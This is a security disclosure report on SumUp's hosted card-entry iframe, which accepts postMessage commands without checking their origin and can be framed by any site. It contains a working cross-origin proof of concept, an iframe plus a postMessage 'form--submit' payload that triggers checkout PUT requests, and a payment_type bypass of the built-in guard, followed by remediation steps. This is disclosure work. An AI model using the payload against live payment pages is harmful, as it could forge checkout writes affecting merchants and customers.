# Cross-origin attacker can drive SumUp's framable PCI card-entry iframe into state-changing checkout writes

**Asset:** `https://gateway.sumup.com/hosted.js`
**Class:** MISCONFIG (missing `event.origin` validation + missing framing protections on a PCI-scoped component)
**Severity (as submitted):** Medium
**Testability:** Proof is static + live DOM. End-to-end payment impact is `HUMAN_ONLY` (see §6).

---

## 1. Summary

`gateway.sumup.com/hosted.js` is the JavaScript payload for SumUp's **hosted card-entry
component** — the iframe that handles PAN/CVC data collection, i.e. the piece of the
checkout flow that exists specifically so that raw card data never touches the merchant's
own page or its own JavaScript.

That component communicates with its embedding page exclusively via `window.postMessage`.
The bundle contains an `origin` parameter that is declared at construction, supplied by the
caller, and then used **only in the outbound direction** — when the iframe posts a message
to the parent. The **inbound** message handler, which is the code path that an attacker
reaches by calling `postMessage` at the iframe from an unrelated page, never reads
`event.origin` at all.

Independently, the component ships no framing protection: no `X-Frame-Options`, no
`Content-Security-Policy: frame-ancestors`.

The two properties compose. Any web page can embed the card-entry iframe, and once embedded
can deliver messages to it that the component will act on, because the component does not
check who sent them. One of the message types it acts on is `form--submit`, which drives a
state-changing `PUT /v0.2/checkouts/{id}` against `api.sumup.com`.

---

## 2. The defect

### 2.1 Inbound handler never reads `event.origin`

The inbound listener destructures its event down to two fields and uses only those:

    const { data, source } = event;   // event.origin is never consulted

Greps for inbound origin validation across the bundle return **zero hits**:

| Check | Occurrences in `hosted.js` |
|---|---|
| `event.origin` | 0 |
| `origin ===` | 0 |
| `origin !==` | 0 |
| `.origin)` | 0 |
| `allowedOrigin` / `allowedOrigins` | 0 |

### 2.2 The `origin` parameter is applied backwards

`origin` **is** present in the bundle, and this is the detail that matters for remediation.
It is:

1. declared in the public configuration/construction surface,
2. supplied by the caller at construction time, and
3. consumed in exactly one place — `t.postMessage(e, n || "*")`, the **outbound** call.

So the value is applied when the iframe talks to the parent, and omitted when the parent
talks to the iframe. A developer asked to "fix the postMessage origin handling" will find
`origin` in scope, see it referenced, and reasonably conclude inbound validation exists.

### 2.3 Outbound `targetOrigin` is also broken, independently

Three messenger construction sites exist:

| Site | Purpose | `targetOrigin` passed |
|---|---|---|
| `Re` | container messenger | `document.referrer` |
| `Ue` | metrics messenger | literal `"*"` |
| `M` | default messenger | literal `"*"` |

`document.referrer` is a **full URL**, not an origin. Passing it as `targetOrigin` is not a
weakened policy, it is a broken one — it is not a valid origin, so it does not match
anything, and the send throws. Two of the three sites use `"*"` outright, which is live
wildcard egress.

### 2.4 No framing protection

| Header | Present |
|---|---|
| `X-Frame-Options` | no |
| `Content-Security-Policy: frame-ancestors` | no |
| `Referrer-Policy` | no |

The card-entry component is framable by any origin on the internet.

---

## 3. Reproduction — the part that is proven

### Step 1 — obtain the payload

    curl -sS https://gateway.sumup.com/hosted.js -o hosted.js
    wc -c hosted.js
    # 26839
    sha256sum hosted.js
    # 1302f1d6a8fa330a71e50647be0281e4b977a198cbf27e0fd59cbecc9f220873

### Step 2 — confirm the inbound handler ignores origin

    grep -c 'event\.origin' hosted.js          # 0
    grep -c 'origin *==='  hosted.js           # 0
    grep -c 'X-Frame-Options' hosted.js        # 0
    grep -c 'frame-ancestors' hosted.js        # 0

### Step 3 — confirm no framing headers are served

    curl -sSI https://gateway.sumup.com/ | grep -iE 'x-frame-options|content-security-policy|referrer-policy'
    # no output

### Step 4 — cross-origin frame + message, from a page on an unrelated origin

Host this on any domain you control, load the card-entry iframe, then post to it:

    <iframe id="sf" src="https://gateway.sumup.com/..."></iframe>
    <script>
      const target = document.getElementById('sf').contentWindow;
      target.postMessage({
        type: 'SumUpCard',
        message: 'form--submit',
        payment: {
          checkoutId: '11111111-2222-4333-8444-555555555555',
          payment_type: 'not_card'
        }
      }, '*');
    </script>

### Step 5 — observe the state-changing request

With the DevTools network log (or `mitmproxy`) attached to the page, the component issues:

    PUT /v0.2/checkouts/11111111-2222-4333-8444-555555555555   Host: api.sumup.com

**This is the observed result.** The request is emitted. What happens server-side is §6.

---

## 4. Why the obvious guard does not stop it

The bundle does contain a frame-access gate — but it is skipped by the request above.

- The gate runs only on the `payment_type === "card"` branch. Setting
  `payment_type: "not_card"` bypasses it entirely.
- The checkout-ID check is a **static regex literal**, recoverable directly from source:

      /^[0-9a-f]{8}-[0-9a-f]{4}-[0-5][0-9a-f]{3}-[089ab][0-9a-f]{3}-[0-9a-f]{12}$/i

  This is a shape check (UUID versions 1–5) against an attacker-chosen value. It is not an
  ownership check and not a session binding.

So there is a guard, and it is on the wrong side of the one condition an attacker controls.

---

## 5. Impact, stated at the level actually proven

An arbitrary web page can embed SumUp's PCI card-entry component and can deliver
messages to it that cause it to emit state-changing `PUT` requests against
`api.sumup.com` for a checkout identifier the attacker supplies.

Three constraints bound this, and all three are real:

| Constraint | Effect |
|---|---|
| No response exfiltration path was found | The attacker **cannot read the result**. This is a write/CSRF primitive, not a data-return primitive. |
| `X-SumUp-Widget-Session-Id` is set unconditionally to the literal string `"undefined"` when absent | The emitted request may carry no valid widget-session credential. |
| `product_origin` / `session_id` are not recoverable from the attacker-side frame context | The request body may be rejected server-side. |

**Server-side acceptance has not been demonstrated.** The PoC proves the client-side
defect and the emission of the request; it does not prove that the API accepts it.

---

## 6. What remains to be confirmed, and how

Confirming the full impact requires a legitimate checkout on an account I do not hold, so
this step is left to the reporter/triager and is **not** claimed as proven:

1. Create a **throwaway** merchant checkout in the SumUp sandbox.
2. Run the §3 PoC from an unrelated origin against that checkout.
3. Observe whether `PUT /v0.2/checkouts/{id}` is accepted and whether the checkout's state
   is actually mutated by the attacker-supplied payload.

Note that `scope.yml` forbids writes to live customer data, so this test is deliberately
**not** run against any real checkout. Using the sandbox keeps the test inside program rules.

If the API rejects the request because the widget-session credential is void, the finding
still stands as a missing-origin-validation and missing-framing-protection defect on a
PCI-scoped component — it just caps severity at Medium. If the API accepts it, the
severity is higher.

---

## 7. Remediation

1. **Validate `event.origin` on the inbound handler.** The check belongs where the message
   arrives, against an explicit allowlist of merchant origins. Add a rejection path for
   messages from any other origin.
2. **Move the existing `origin` parameter to the inbound handler.** It already exists and is
   already caller-supplied; it is applied to the wrong direction. This is a small change, and
   its smallness is the point — the parameter is already part of the public API.
3. **Fix the outbound `targetOrigin`.** `Re` passes `document.referrer`, which is a full URL
   and can never match an origin. Derive the origin properly. Replace the `"*"` at `Ue` and
   `M` with explicit origins.
4. **Ship framing protections.** `Content-Security-Policy: frame-ancestors` (preferred, allows
   per-merchant allowlists) and/or `X-Frame-Options: SAMEORIGIN`.
5. **Move the frame-access gate** so it cannot be skipped by the `payment_type` value, and
   bind the checkout ID to the widget session rather than validating its UUID shape.

